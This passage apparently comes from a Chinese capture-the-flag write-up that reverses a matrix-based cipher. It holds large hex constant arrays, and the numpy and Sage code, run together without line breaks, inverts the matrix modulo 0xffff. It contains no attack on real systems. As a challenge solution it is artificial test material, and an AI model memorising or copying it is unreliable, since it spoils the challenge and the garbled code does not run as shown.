[0xFFFFFF8D, 0x0, 0xF, 0x1, 0xFFFFFFEB, 0x31, 0xFFFFFFE8, 0x5, 0x2A, 0xFFFFFFFE, 0xFFFFFFF0, 0xFFFFFFF7, 0x28, 0x2E, 0x38, 0xFFFFFFDE, 0x10, 0xFFFFFFE7, 0x27, 0x1A, 0x17, 0x2A, 0xFFFFFFC8, 0x0, 0xFFFFFFE1, 0xFFFFFFF1, 0x7, 0xFFFFFFF2, 0xB, 0x16, 0xD, 0xFFFFFFDF, 0xFFFFFFF7, 0x28, 0x1F, 0x36, 0xFFFFFFED, 0xFFFFFFE6, 0xFFFFFFEC, 0xC, 0x1E, 0xE, 0x2C, 0xFFFFFFF2, 0x31, 0xFFFFFFFC, 0xFFFFFFFC, 0x19, 0x35, 0x8, 0xFFFFFFD3, 0x14, 0xFFFFFFFB, 0x3A, 0x10, 0xFFFFFFF1, 0x12, 0x3B, 0x2D, 0x17, 0x32, 0x33, 0xFFFFFFDF, 0xB, 0x2E, 0xFFFFFFDE, 0xFFFFFFF1, 0xFFFFFFF7, 0xFFFFFFD2, 0xFFFFFFCE, 0x3, 0xFFFFFFDD, 0x9, 0x27, 0xFFFFFFF3, 0xFFFFFF81, 0x13, 0xFFFFFFD8, 0x1E, 0x15, 0xFFFFFFD8, 0x20, 0x25, 0xFFFFFFEC, 0x1E, 0x1E, 0x1D, 0x19, 0x3, 0x12, 0xFFFFFFF4, 0xFFFFFFC6, 0xFFFFFFD4, 0xFFFFFFB4, 0x27, 0xFFFFFFC9, 0xFFFFFFEE, 0xFFFFFFDE, 0x4, 0xFFFFFFF0, 0xFFFFFFED, 0xFFFFFFF7, 0xFFFFFFFC, 0xFFFFFFDD, 0x1F, 0xFFFFFFE0, 0x0, 0x3B, 0x5, 0x17, 0x1D, 0xFFFFFFD8, 0xFFFFFFE2, 0xFFFFFFFF, 0x36, 0xFFFFFFF3, 0xFFFFFFFF, 0xFFFFFFE1, 0x24, 0x38, 0x11, 0x10, 0xFFFFFFD8, 0x12, 0x9, 0xFFFFFF7F, 0x24, 0xFFFFFFDF, 0x0, 0xFFFFFFE9, 0x17, 0x2B, 0x3, 0x1E, 0xA, 0xFFFFFFFC, 0xFFFFFFD8, 0x3, 0xFFFFFFD6, 0xFFFFFFD8, 0xA, 0xFFFFFFEA, 0x1C, 0xFFFFFFDC, 0x18, 0xFFFFFFFA, 0xFFFFFFEC, 0xFFFFFFFE, 0xFFFFFFE7, 0x11, 0xFFFFFFCB, 0xFFFFFFFA, 0xFFFFFFEE, 0x31, 0xFFFFFFF0, 0xE, 0xFFFFFFFF, 0x1B, 0xFFFFFFF4, 0xFFFFFFB8, 0xFFFFFFF6, 0xFFFFFFDA, 0xFFFFFFFC, 0x0, 0x35, 0x1A, 0x17, 0xFFFFFFE4, 0x38, 0x1A, 0x2, 0x39, 0xFFFFFFDA, 0xFFFFFFEE, 0xE, 0xFFFFFF85, 0x30, 0x26, 0xFFFFFFE3, 0xFFFFFFF4, 0xFFFFFFF4, 0x12, 0xFFFFFFDA, 0x1F, 0x3B, 0xFFFFFFE5, 0xFFFFFFD4, 0xFFFFFFC8, 0x1B, 0xFFFFFFDF, 0xFFFFFFE3, 0x13, 0x36, 0x16, 0xFFFFFFF2, 0xFFFFFFE3, 0x10, 0xFFFFFFE1, 0x2E, 0x1E, 0xFFFFFFDE, 0x48, 0xFFFFFFA2, 0x18, 0x29, 0x34, 0xFFFFFFF7, 0xFFFFFFF3, 0xFFFFFFDF, 0xFFFFFFF7, 0x38, 0xFFFFFFFB, 0x19, 0x36, 0x3, 0x2B, 0xFFFFFFF3, 0x31, 0x38, 0x24, 0x2B, 0xFFFFFFE5, 0x35, 0xFFFFFFF1, 0x7, 0xFFFFFFA2, 0x53, 0xFFFFFFE4, 0xFFFFFFE4, 0x1F, 0x17, 0xFFFFFFE3, 0x2C, 0xFFFFFFD8, 0xFFFFFFE1, 0x3, 0x0, 0x3A, 0x3C, 0xFFFFFFD6, 0xFFFFFFD8, 0xFFFFFFE5, 0x37, 0x2E, 0xFFFFFFDC, 0xFFFFFFEA, 0xFFFFFFD3, 0x19, 0xFFFFFFF7, 0x16, 0x18, 0xFFFFFFFE, 0xC, 0xFFFFFFE2, 0x23, 0x20, 0xB, 0xFFFFFFFE, 0x1D, 0xFFFFFFE0, 0xFFFFFFDF, 0x2A, 0xFFFFFFCB, 0x16, 0xFFFFFFDE, 0xFFFFFFE2, 0x21, 0xFFFFFFFE, 0x2, 0x17, 0xFFFFFFE4, 0x3A, 0xFFFFFFA1, 0xFFFFFFF9, 0x14, 0x17, 0xFFFFFFF0, 0x39, 0xFFFFFFF4, 0xFFFFFFB5, 0xFFFFFFFD, 0x13, 0xFFFFFFE6, 0x3A, 0x31, 0xFFFFFFED, 0x2D, 0x21, 0x39, 0x15, 0x2F, 0x10, 0x12, 0xF, 0xFFFFFFEA, 0x6, 0x3B, 0xFFFFFFF4, 0xFFFFFFE7, 0x2D, 0x27, 0x1, 0x1B, 0xFFFFFFFE, 0x29, 0xFFFFFFB7, 0x19, 0x6, 0x8, 0xFFFFFFE8, 0x9, 0xB, 0xFFFFFFE3, 0x28, 0xFFFFFFE6, 0x1A, 0xFFFFFFB3, 0xFFFFFFD3, 0xFFFFFFA8, 0xFFFFFFE2, 0xFFFFFFA1, 0x22, 0xFFFFFFE4, 0x1, 0xFFFFFFD8, 0xFFFFFF8F, 0x2, 0x6, 0xFFFFFFFA, 0xFFFFFFFC, 0xFFFFFFDE, 0x1B, 0xFFFFFFDB, 0xFFFFFFF4, 0xFFFFFFF5, 0x23, 0x1B, 0x2, 0x9, 0xD, 0xFFFFFFE1, 0xFFFFFFFA, 0xC, 0xFFFFFFF2, 0xFFFFFFF0, 0xFFFFFFF6, 0x22, 0xFFFFFFF7, 0x19, 0xFFFFFFED, 0xFFFFFF8D, 0xFFFFFFF7, 0xFFFFFFEA, 0xFFFFFFFF, 0x9, 0x29, 0xFFFFFFD2, 0xFFFFFFCB, 0xFFFFFFC4, 0x1C, 0xFFFFFFDC, 0xFFFFFFEA, 0x12, 0x22, 0x19, 0x30, 0x32, 0x1B, 0xFFFFFFCD, 0xFFFFFFE8, 0x2D, 0x47, 0xFFFFFFDA, 0xFFFFFFF1, 0x20, 0x33, 0xFFFFFFE8, 0xF, 0x2D, 0x5, 0xFFFFFFC9, 0x17, 0x8, 0x26, 0x2B, 0x13, 0x16, 0xFFFFFFD9, 0xFFFFFFDB, 0xFFFFFFF2, 0xFFFFFFFC, 0xFFFFFFDE, 0x8, 0xFFFFFFED, 0xFFFFFFF3, 0x2B, 0xFFFFFFDC, 0xFFFFFFD9, 0x1C, 0x18, 0x3F, 0xFFFFFFCA, 0x8, 0xFFFFFFE9, 0xFFFFFFE5, 0xFFFFFFCE, 0x22, 0x24, 0x26, 0xFFFFFFFB, 0x28, 0xFFFFFFFD, 0xFFFFFFF8, 0xFFFFFFFA, 0x23, 0xFFFFFFEF, 0x1A, 0x23, 0x1E, 0xFFFFFFED, 0xFFFFFFDB, 0x8, 0x0, 0xFFFFFFE3, 0xFFFFFFC7, 0xFFFFFFC3, 0xFFFFFFCA, 0x0, 0xFFFFFFF0, 0x3B, 0xFFFFFFF3, 0xFFFFFFD9, 0xFFFFFFF2, 0xFFFFFFE6, 0x37, 0x0, 0x3A, 0x18, 0x27, 0x15, 0x2C, 0xFFFFFFEA, 0x16, 0xFFFFFFDA, 0xFFFFFFEF, 0x3, 0x39, 0xFFFFFFEC, 0xFFFFFFF6, 0x2, 0xE, 0xFFFFFFF6, 0x15, 0xFFFFFFD8, 0x8, 0x15, 0xFFFFFFE2, 0xFFFFFFEE, 0xFFFFFFDD, 0xFFFFFFEB, 0xFFFFFFFD, 0xFFFFFFFD, 0xFFFFFFF8, 0x2D, 0xFFFFFFE4, 0x8, 0x14, 0xFFFFFFDA, 0xFFFFFFE3, 0xFFFFFFD8, 0xFFFFFFD8, 0x45, 0x14, 0xFFFFFFED, 0x1C, 0x16, 0xF, 0xD, 0xFFFFFFDE, 0xFFFFFFE6, 0xFFFFFFE3, 0xFFFFFFED, 0xFFFFFFE0, 0xFFFFFFF2, 0x26, 0xFFFFFFDB, 0x1B, 0x36, 0xFFFFFFE2, 0xFFFFFFDA, 0x38, 0x27, 0xFFFFFFF1, 0x2B, 0xFFFFFFDD, 0xFFFFFFFD, 0x1F, 0xFFFFFFCB, 0xFFFFFFF7, 0xFFFFFFD1, 0xFFFFFFC6, 0x3, 0xC, 0x19, 0x2D, 0x34, 0xFFFFFFDA, 0xFFFFFFF6, 0xE, 0xFFFFFFEF, 0xFFFFFFE3, 0xC, 0x29, 0x17, 0xFFFFFFD9, 0x10, 0xFFFFFFE2, 0x5, 0x3, 0x1B, 0x5, 0x15, 0x10, 0x29, 0x21, 0xFFFFFF80, 0x11, 0x17, 0x22, 0x33, 0x17, 0x16, 0x14, 0xFFFFFFFE, 0x27, 0x37, 0xE, 0x28, 0x30, 0x38, 0x39, 0x4, 0x25, 0xFFFFFFE9, 0x1B, 0x2, 0x5, 0x23, 0x1B, 0xFFFFFFF0, 0xFFFFFFBE, 0xFFFFFFD9, 0xF, 0x28, 0xFFFFFFE8, 0xFFFFFFE3, 0xFFFFFFFE, 0xFFFFFFFB, 0x36, 0xFFFFFFE7, 0x14, 0x3B, 0xFFFFFFF8, 0x8, 0xFFFFFFF5, 0xFFFFFFFC, 0xF, 0x3A, 0x2A, 0xFFFFFFDA, 0xFFFFFFF5, 0x1F, 0x32, 0x6, 0x25, 0xFFFFFFC8]I= np.array(I).reshape(-1,24)K = (I + H) &amp; 0xffffK %= 0xffffprint(&quot;(I+H)result:&quot;)print(np.array2string(K,max_line_width=np.inf))\n\n\n\n提取出密文按照矩阵操作进行逆运算。原本打算用numpy来求逆矩阵，但是因为python的数据是没有定义长度大小的，所以numpy会算出小数。而我们的原文加密中，需要把大小维持在0xffff以内，所以我们需要为这个运算规定一个运算域，这里用sage的Zmod(2**16 - 1)实现，并用”“求解逆矩阵。即matrix(Fp, G)是在域Fp下求G的逆矩阵。这样求出的结果就是正常的。\nfrom sage.all import Zmod, matriximport numpy as npG = [0x6C6,0xB350,0xFB2A,0xA846,0xABD5,0xFBBA,0xD20,0xB2C4,0xBD5,0xA4F3,0x4064,0xBDCF,0x8511,0x2911,0xC4BD,0x65B6,0x7010,0x1F43,0x20F1,0x7268,0x6EF8,0x1524,0xF6A8,0x3A2,0x37CB,0xC40F,0x9720,0x13D2,0x3AA,0x4671,0xC1FC,0x2147,0xF9EF,0xB8AA,0x81EF,0x1F7A,0xDEAA,0x89BF,0xC101,0x2992,0xE50D,0x80D5,0xA7C2,0x5D2,0x9DF,0xAE25,0xCB5E,0xA5A9,0x9763,0xBAF2,0x86F8,0x9BFC,0x4435,0x70B3,0xAB91,0x44F4,0x4495,0xE241,0x43C9,0xCC02,0xA778,0x5031,0x9994,0xDBE1,0xE6CC,0xF905,0x7ED4,0x713A,0x1E87,0xA621,0xE3C5,0x2DCF,0x95C2,0xF961,0xA7E3,0xFAD7,0x2244,0xE219,0x7FFC,0x4CCD,0x5B2,0x3594,0xF6DD,0x6037,0x2C8F,0x5B3,0x3DB5,0x5361,0x9025,0xDB95,0xB3C9,0x6450,0xAE6E,0xF74F,0xB761,0xF9D0,0xA9,0xF10C,0xECBD,0xC698,0xC22,0x7EB8,0xEAA5,0xAB78,0x437F,0xBF50,0x9DA0,0x70E1,0xDBE8,0x9B40,0xB9A5,0xCBF4,0xE492,0xB5F6,0x919F,0x4B33,0x9EEF,0x5E9A,0xFFC0,0xAB7,0xF3BF,0x8283,0x41DF,0x7773,0x81B4,0xBA07,0xFD6,0x8FD3,0x5D0F,0x33B1,0xF5B0,0xFFBB,0x47B5,0xE9F7,0xD783,0xA9E6,0x96C1,0x1816,0xC30A,0xA3CD,0x7884,0xB1EC,0xC61,0xF77,0xB14A,0x8AFF,0xC779,0x626D,0xD759,0x6C81,0xCC5D,0xBD1A,0x95F5,0x5D61,0x9C9E,0x6293,0x2911,0x9758,0xB6D0,0x5BD4,0x3B98,0xDC7F,0xF27C,0x9816,0xDE49,0x8575,0xD547,0x6E36,0x8635,0x3E95,0xD8C6,0x24C7,0x6B58,0x9CEF,0xEA8C,0x582C,0xC9E0,0xBD3D,0xBC4E,0xD00C,0x3C61,0xC9F7,0xE213,0x4893,0x51C6,0xA72F,0xE1F4,0xF767,0x1A78,0x8D4F,0x423B,0xDA35,0xED13,0x228B,0xCD29,0x9F34,0x997D,0x5D1E,0xC18A,0x6159,0x6986,0x3C38,0xA076,0xFC28,0x6FC4,0x8751,0x96E0,0xFAFD,0x52C6,0x4906,0x1173,0x45C,0xDD70,0x45F3,0x5044,0x92AE,0x428A,0x29D8,0xC652,0x679D,0x213F,0xBF03,0xF0C1,0xE6A,0xBDD8,0x4591,0xB5B9,0x2558,0xA92D,0xC886,0xC02F,0x89CF,0x5395,0xC578,0x2078,0x4ADF,0xC6FF,0x6EC1,0x4A15,0x1309,0xFDED,0x468C,0x8FEB,0xAEEA,0xD873,0x1B87,0xE75B,0x80B5,0x236D,0x7097,0x6857,0x6B43,0x2BC,0x91EA,0xB01D,0x777A,0xB692,0x3918,0xD1CF,0x959E,0x572,0x59C7,0xD4FA,0xD9AB,0x904F,0x5D27,0x396C,0x4B82,0x85F2,0xA2F0,0xC88A,0x88E5,0xF4E2,0x6988,0x6496,0x4035,0x3D0E,0x15DC,0xB6DD,0xCBE4,0x2D92,0x418F,0x9AD4,0xAEDC,0xFA46,0x25E7,0x22A8,0xAEE5,0x1798,0xDFBD,0xCD93,0x58E,0x27DC,0xEAFF,0xAB5A,0x37AB,0xB78F,0x5E02,0x8E73,0x3AEC,0xF80C,0x711A,0x914C,0xDD62,0xE2D3,0x6DFE,0x3597,0x25C5,0xAD18,0xE45F,0x3808,0xEB56,0x33EA,0x6D19,0xFBCC,0xA388,0xB0FD,0xC271,0xED90,0x4095,0x440F,0x262D,0xB512,0x623A,0x6410,0x62A5,0x6995,0xA000,0xBAF9,0xE445,0x2465,0xA65E,0xB603,0xC209,0xB159,0x6C32,0x11D,0x3C2E,0xB23D,0xB479,0x9D4F,0xEF2F,0x833E,0xFE0F,0x2EB3,0x8B7B,0x61DB,0x1DC6,0x6534,0x37F1,0x908F,0xD7D,0xD25A,0xC690,0xB29,0x3220,0x97F,0x321A,0xCAC4,0x7AB,0x73AE,0xDB4E,0x4A65,0x96A0,0x64F0,0x5F45,0x1E77,0x2DE3,0xDD0C,0xA4C8,0x33DF,0xFACF,0x29B1,0x7CB,0x24AB,0x2A19,0x43F2,0x3293,0xC952,0x83EE,0xE01,0x424C,0x2CCC,0x21CB,0x701F,0x4A27,0x4E30,0x4ADC,0x846,0xDA65,0xE1F1,0xD6CF,0x15C1,0xED78,0xCFF2,0x1C69,0xEF05,0xDD53,0x2BB9,0x1401,0xEFD,0x7031,0xEFD9,0x5790,0x14B8,0xA5C6,0xFA73,0x1F8C,0x6171,0xA46B,0xC524,0x8A78,0x2DC3,0x61BC,0x4A2,0xDDC4,0x73C4,0x8C50,0xCFBC,0x3388,0x73F0,0xE94C,0x85CE,0x20BC,0x8F08,0x67E7,0xE5C8,0x69BD,0x46BF,0x69E4,0xF024,0xF5BB,0xAB91,0xC32,0x57E8,0xCC30,0xC68A,0xA5F3,0xEFBF,0x5F74,0xE7F,0x397F,0xF02B,0x2E51,0xFFE,0x32CE,0xF66A,0xA69D,0x93B1,0xE53F,0xF854,0x60B8,0xA7A2,0xEF57,0x6A86,0xC3CA,0x93E4,0xB2F1,0x590,0x8CC5,0xEEB7,0x663D,0x6311,0xDB16,0x9294,0x8299,0xBD,0xFCA1,0xD53F,0x7E60,0xFF44,0xA42C,0xA8F1,0x5175,0xE9A0,0xEB14,0xDB64,0xB072,0x3179,0x59D2,0xB7FF,0x2EE0,0xFD00,0x42FD,0x17FB,0xA871,0xD3CE,0x73B9,0x532C,0x2449,0x45A8,0xE49A,0xC3CB,0x4497,0x5841,0x11D7,0x7D08,0x46C3,0xCF5E,0x705C,0xC024,0xD07C,0x7F16,0x9D97,0x3E91,0x249F,0xE9A7,0x14E5,0x8C35,0x7A6D,0xF3E9,0xB8F6,0xDCDD,0x449D,0xA524,0xF38,0x4510,0x589D,0x78A1,0x4ABA,0xA3E5,0x9D3,0xF34B,0x5705,0xDA4D,0x3330,0x1949,0x2949,0xCE6C,0x5299,0x340,0xC795,0x98C2,0xD611,0x6212,0xB043,0x3253,0xFCF1,0x593C,0x3496,0x8D5,0xF597,0x7436,0xE146,0xCE9A,0xFDF3,0xB57C,0x59AA,0x8F34,0x6A4E,0x22F9,0xDB15,0x2CA,0x1DE0,0x1E5B,0x3A0F,0xAB47,0x7280,0x16BD,0x826B,0xFFEF,0x69A4,0xE62,0x674E,0xCDC3,0x2381,0x1187,0x12CC,0xD668,0x4DCF,0x89AC,0x75B6,0x95CD,0x1915,0xD51E,0x78B2]I = [0xFFFFFF8D, 0x0, 0xF, 0x1, 0xFFFFFFEB, 0x31, 0xFFFFFFE8, 0x5, 0x2A, 0xFFFFFFFE, 0xFFFFFFF0, 0xFFFFFFF7, 0x28, 0x2E, 0x38, 0xFFFFFFDE, 0x10, 0xFFFFFFE7, 0x27, 0x1A, 0x17, 0x2A, 0xFFFFFFC8, 0x0, 0xFFFFFFE1, 0xFFFFFFF1, 0x7, 0xFFFFFFF2, 0xB, 0x16, 0xD, 0xFFFFFFDF, 0xFFFFFFF7, 0x28, 0x1F, 0x36, 0xFFFFFFED, 0xFFFFFFE6, 0xFFFFFFEC, 0xC, 0x1E, 0xE, 0x2C, 0xFFFFFFF2, 0x31, 0xFFFFFFFC, 0xFFFFFFFC, 0x19, 0x35, 0x8, 0xFFFFFFD3, 0x14, 0xFFFFFFFB, 0x3A, 0x10, 0xFFFFFFF1, 0x12, 0x3B, 0x2D, 0x17, 0x32, 0x33, 0xFFFFFFDF, 0xB, 0x2E, 0xFFFFFFDE, 0xFFFFFFF1, 0xFFFFFFF7, 0xFFFFFFD2, 0xFFFFFFCE, 0x3, 0xFFFFFFDD, 0x9, 0x27, 0xFFFFFFF3, 0xFFFFFF81, 0x13, 0xFFFFFFD8, 0x1E, 0x15, 0xFFFFFFD8, 0x20, 0x25, 0xFFFFFFEC, 0x1E, 0x1E, 0x1D, 0x19, 0x3, 0x12, 0xFFFFFFF4, 0xFFFFFFC6, 0xFFFFFFD4, 0xFFFFFFB4, 0x27, 0xFFFFFFC9, 0xFFFFFFEE, 0xFFFFFFDE, 0x4, 0xFFFFFFF0, 0xFFFFFFED, 0xFFFFFFF7, 0xFFFFFFFC, 0xFFFFFFDD, 0x1F, 0xFFFFFFE0, 0x0, 0x3B, 0x5, 0x17, 0x1D, 0xFFFFFFD8, 0xFFFFFFE2, 0xFFFFFFFF, 0x36, 0xFFFFFFF3, 0xFFFFFFFF, 0xFFFFFFE1, 0x24, 0x38, 0x11, 0x10, 0xFFFFFFD8, 0x12, 0x9, 0xFFFFFF7F, 0x24, 0xFFFFFFDF, 0x0, 0xFFFFFFE9, 0x17, 0x2B, 0x3, 0x1E, 0xA, 0xFFFFFFFC, 0xFFFFFFD8, 0x3, 0xFFFFFFD6, 0xFFFFFFD8, 0xA, 0xFFFFFFEA, 0x1C, 0xFFFFFFDC, 0x18, 0xFFFFFFFA, 0xFFFFFFEC, 0xFFFFFFFE, 0xFFFFFFE7, 0x11, 0xFFFFFFCB, 0xFFFFFFFA, 0xFFFFFFEE, 0x31, 0xFFFFFFF0, 0xE, 0xFFFFFFFF, 0x1B, 0xFFFFFFF4, 0xFFFFFFB8, 0xFFFFFFF6, 0xFFFFFFDA, 0xFFFFFFFC, 0x0, 0x35, 0x1A, 0x17, 0xFFFFFFE4, 0x38, 0x1A, 0x2, 0x39, 0xFFFFFFDA, 0xFFFFFFEE, 0xE, 0xFFFFFF85, 0x30, 0x26, 0xFFFFFFE3, 0xFFFFFFF4, 0xFFFFFFF4, 0x12, 0xFFFFFFDA, 0x1F, 0x3B, 0xFFFFFFE5, 0xFFFFFFD4, 0xFFFFFFC8, 0x1B, 0xFFFFFFDF, 0xFFFFFFE3, 0x13, 0x36, 0x16, 0xFFFFFFF2, 0xFFFFFFE3, 0x10, 0xFFFFFFE1, 0x2E, 0x1E, 0xFFFFFFDE, 0x48, 0xFFFFFFA2, 0x18, 0x29, 0x34, 0xFFFFFFF7, 0xFFFFFFF3, 0xFFFFFFDF, 0xFFFFFFF7, 0x38, 0xFFFFFFFB, 0x19, 0x36, 0x3, 0x2B, 0xFFFFFFF3, 0x31, 0x38, 0x24, 0x2B, 0xFFFFFFE5, 0x35, 0xFFFFFFF1, 0x7, 0xFFFFFFA2, 0x53, 0xFFFFFFE4, 0xFFFFFFE4, 0x1F, 0x17, 0xFFFFFFE3, 0x2C, 0xFFFFFFD8, 0xFFFFFFE1, 0x3, 0x0, 0x3A, 0x3C, 0xFFFFFFD6, 0xFFFFFFD8, 0xFFFFFFE5, 0x37, 0x2E, 0xFFFFFFDC, 0xFFFFFFEA, 0xFFFFFFD3, 0x19, 0xFFFFFFF7, 0x16, 0x18, 0xFFFFFFFE, 0xC, 0xFFFFFFE2, 0x23, 0x20, 0xB, 0xFFFFFFFE, 0x1D, 0xFFFFFFE0, 0xFFFFFFDF, 0x2A, 0xFFFFFFCB, 0x16, 0xFFFFFFDE, 0xFFFFFFE2, 0x21, 0xFFFFFFFE, 0x2, 0x17, 0xFFFFFFE4, 0x3A, 0xFFFFFFA1, 0xFFFFFFF9, 0x14, 0x17, 0xFFFFFFF0, 0x39, 0xFFFFFFF4, 0xFFFFFFB5, 0xFFFFFFFD, 0x13, 0xFFFFFFE6, 0x3A, 0x31, 0xFFFFFFED, 0x2D, 0x21, 0x39, 0x15, 0x2F, 0x10, 0x12, 0xF, 0xFFFFFFEA, 0x6, 0x3B, 0xFFFFFFF4, 0xFFFFFFE7, 0x2D, 0x27, 0x1, 0x1B, 0xFFFFFFFE, 0x29, 0xFFFFFFB7, 0x19, 0x6, 0x8, 0xFFFFFFE8, 0x9, 0xB, 0xFFFFFFE3, 0x28, 0xFFFFFFE6, 0x1A, 0xFFFFFFB3, 0xFFFFFFD3, 0xFFFFFFA8, 0xFFFFFFE2, 0xFFFFFFA1, 0x22, 0xFFFFFFE4, 0x1, 0xFFFFFFD8, 0xFFFFFF8F, 0x2, 0x6, 0xFFFFFFFA, 0xFFFFFFFC, 0xFFFFFFDE, 0x1B, 0xFFFFFFDB, 0xFFFFFFF4, 0xFFFFFFF5, 0x23, 0x1B, 0x2, 0x9, 0xD, 0xFFFFFFE1, 0xFFFFFFFA, 0xC, 0xFFFFFFF2, 0xFFFFFFF0, 0xFFFFFFF6, 0x22, 0xFFFFFFF7, 0x19, 0xFFFFFFED, 0xFFFFFF8D, 0xFFFFFFF7, 0xFFFFFFEA, 0xFFFFFFFF, 0x9, 0x29, 0xFFFFFFD2, 0xFFFFFFCB, 0xFFFFFFC4, 0x1C, 0xFFFFFFDC, 0xFFFFFFEA, 0x12, 0x22, 0x19, 0x30, 0x32, 0x1B, 0xFFFFFFCD, 0xFFFFFFE8, 0x2D, 0x47, 0xFFFFFFDA, 0xFFFFFFF1, 0x20, 0x33, 0xFFFFFFE8, 0xF, 0x2D, 0x5, 0xFFFFFFC9, 0x17, 0x8, 0x26, 0x2B, 0x13, 0x16, 0xFFFFFFD9, 0xFFFFFFDB, 0xFFFFFFF2, 0xFFFFFFFC, 0xFFFFFFDE, 0x8, 0xFFFFFFED, 0xFFFFFFF3, 0x2B, 0xFFFFFFDC, 0xFFFFFFD9, 0x1C, 0x18, 0x3F, 0xFFFFFFCA, 0x8, 0xFFFFFFE9, 0xFFFFFFE5, 0xFFFFFFCE, 0x22, 0x24, 0x26, 0xFFFFFFFB, 0x28, 0xFFFFFFFD, 0xFFFFFFF8, 0xFFFFFFFA, 0x23, 0xFFFFFFEF, 0x1A, 0x23, 0x1E, 0xFFFFFFED, 0xFFFFFFDB, 0x8, 0x0, 0xFFFFFFE3, 0xFFFFFFC7, 0xFFFFFFC3, 0xFFFFFFCA, 0x0, 0xFFFFFFF0, 0x3B, 0xFFFFFFF3, 0xFFFFFFD9, 0xFFFFFFF2, 0xFFFFFFE6, 0x37, 0x0, 0x3A, 0x18, 0x27, 0x15, 0x2C, 0xFFFFFFEA, 0x16, 0xFFFFFFDA, 0xFFFFFFEF, 0x3, 0x39, 0xFFFFFFEC, 0xFFFFFFF6, 0x2, 0xE, 0xFFFFFFF6, 0x15, 0xFFFFFFD8, 0x8, 0x15, 0xFFFFFFE2, 0xFFFFFFEE, 0xFFFFFFDD, 0xFFFFFFEB, 0xFFFFFFFD, 0xFFFFFFFD, 0xFFFFFFF8, 0x2D, 0xFFFFFFE4, 0x8, 0x14, 0xFFFFFFDA, 0xFFFFFFE3, 0xFFFFFFD8, 0xFFFFFFD8, 0x45, 0x14, 0xFFFFFFED, 0x1C, 0x16, 0xF, 0xD, 0xFFFFFFDE, 0xFFFFFFE6, 0xFFFFFFE3, 0xFFFFFFED, 0xFFFFFFE0, 0xFFFFFFF2, 0x26, 0xFFFFFFDB, 0x1B, 0x36, 0xFFFFFFE2, 0xFFFFFFDA, 0x38, 0x27, 0xFFFFFFF1, 0x2B, 0xFFFFFFDD, 0xFFFFFFFD, 0x1F, 0xFFFFFFCB, 0xFFFFFFF7, 0xFFFFFFD1, 0xFFFFFFC6, 0x3, 0xC, 0x19, 0x2D, 0x34, 0xFFFFFFDA, 0xFFFFFFF6, 0xE, 0xFFFFFFEF, 0xFFFFFFE3, 0xC, 0x29, 0x17, 0xFFFFFFD9, 0x10, 0xFFFFFFE2, 0x5, 0x3, 0x1B, 0x5, 0x15, 0x10, 0x29, 0x21, 0xFFFFFF80, 0x11, 0x17, 0x22, 0x33, 0x17, 0x16, 0x14, 0xFFFFFFFE, 0x27, 0x37, 0xE, 0x28, 0x30, 0x38, 0x39, 0x4, 0x25, 0xFFFFFFE9, 0x1B, 0x2, 0x5, 0x23, 0x1B, 0xFFFFFFF0, 0xFFFFFFBE, 0xFFFFFFD9, 0xF, 0x28, 0xFFFFFFE8, 0xFFFFFFE3, 0xFFFFFFFE, 0xFFFFFFFB, 0x36, 0xFFFFFFE7, 0x14, 0x3B, 0xFFFFFFF8, 0x8, 0xFFFFFFF5, 0xFFFFFFFC, 0xF, 0x3A, 0x2A, 0xFFFFFFDA, 0xFFFFFFF5, 0x1F, 0x32, 0x6, 0x25, 0xFFFFFFC8]I= np.array(I).reshape(-1,24)E = [0x54,0x12,0x2,0x2,0x4C,0x41,0x33,0x51,0x3F,0xC,0x6,0x18,0x40,0x43,0x34,0x47,0x5F,0x22,0x62,0x21,0x5E,0x1A,0x27,0x4D,0x33,0x56,0x48,0x2C,0x10,0x4,0x49,0x2,0x1C,0x28,0x4D,0x1C,0x3F,0x2B,0x17,0x19,0x27,0x42,0x52,0x46,0x3C,0x0,0x39,0x41,0x29,0x9,0x62,0x27,0x15,0x17,0x1A,0x1D,0x19,0x48,0x56,0x12,0x0,0x4,0x37,0x4A,0x3F,0x0,0x4B,0x19,0x3F,0x37,0x39,0x24,0xE,0x59,0x15,0xB8,0x11,0x3D,0x9,0x21,0x46,0x25,0x63,0x3F,0x4,0x17,0x59,0x5F,0x3E,0x61,0x51,0x1E,0x52,0x36,0x1,0x1B,0x25,0xC,0x13,0x3A,0x8C,0x61,0x44,0x2E,0x22,0x22,0x3E,0x62,0x39,0x56,0x3E,0x1E,0x2C,0x3B,0x32,0xD,0x32,0x4F,0x4C,0x43,0x60,0x32,0x2D,0x15,0x55,0xAE,0x6,0x5A,0x22,0x11,0x53,0x55,0x2F,0x1B,0x1D,0x13,0xB,0x26,0x38,0x21,0x59,0xA,0x33,0x52,0x62,0xF,0x18,0x53,0x2B,0x2C,0x8A,0x1,0x34,0x49,0x4D,0x3,0x25,0x9,0x3F,0x18,0x5D,0x3C,0x2C,0x24,0x44,0x11,0x1,0x18,0x28,0x38,0x3A,0x4D,0x1F,0x45,0xF,0x10,0x34,0xC,0x1A,0x2E,0x5E,0x1,0x31,0x59,0x6,0x33,0x39,0x7,0x5,0x4A,0xB,0x35,0x62,0x41,0x1B,0x15,0x60,0x31,0x19,0x27,0x9C,0x4D,0x27,0x4F,0x4F,0x21,0x7,0x38,0x63,0x32,0x2A,0x58,0xF,0x2F,0x5F,0x15,0x3B,0x11,0x4F,0x5E,0x2D,0x5,0xF,0xE,0x29,0x42,0x26,0x3C,0x13,0x4F,0x12,0x2B,0x41,0x11,0x9,0x6,0x41,0x38,0xE,0x7,0x44,0x2B,0x1,0x3E,0x1A,0x53,0x43,0x2C,0x3,0xC,0x32,0x0,0x4F,0xF,0x5B,0x60,0x58,0x47,0x4B,0x10,0x6,0xA,0x31,0x47,0x19,0x10,0x35,0xA,0x4E,0x6,0x17,0x7,0x56,0x4C,0x3B,0x58,0x18,0x18,0x2E,0x4B,0x50,0x8,0x42,0x1D,0x2E,0x59,0x59,0x34,0x5E,0x16,0x42,0x4,0x12,0x47,0x20,0x21,0x2,0x20,0x34,0x5,0x78,0x44,0x15,0x40,0x60,0x2A,0x59,0x27,0x17,0x62,0x5B,0x60,0x17,0x4B,0x46,0x8,0x27,0x55,0x59,0x42,0xB,0x60,0x1E,0x58,0x51,0x96,0x3D,0x19,0x32,0x30,0x55,0x56,0x56,0x50,0x41,0x1C,0x4C,0x6,0x0,0x4C,0x5,0x2A,0x18,0x35,0x12,0x51,0x3,0x19,0x52,0x34,0x46,0x8,0xD,0x56,0x3A,0x36,0x49,0x2B,0x47,0x46,0x47,0x15,0x48,0x53,0x4A,0x18,0x24,0x43,0x9,0x28,0x18,0x26,0xC,0x36,0x5,0x70,0x61,0x4D,0x11,0x27,0x23,0x39,0x13,0x